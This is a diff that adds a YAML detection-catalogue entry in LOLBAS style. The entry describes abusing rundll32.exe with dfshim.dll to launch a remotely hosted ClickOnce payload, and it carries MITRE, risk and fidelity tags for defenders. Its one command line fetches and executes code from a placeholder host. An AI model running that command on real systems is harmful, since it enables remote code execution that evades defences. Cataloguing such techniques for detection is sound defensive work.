@@ -1,0 +1,19 @@
+- command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo
+  description: Execute a ClickOnce application hosted as a remote payload via dfshim.dll abuse.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1127
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Libraries/Dfshim/
+  risk: High
+  risk_reason: Manual usage of rundll32 with dfshim.dll is a suspicious activity.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior for most organizations.
+  tool: dfshim
+  threatactors:
+    N/A:
+      - N/A
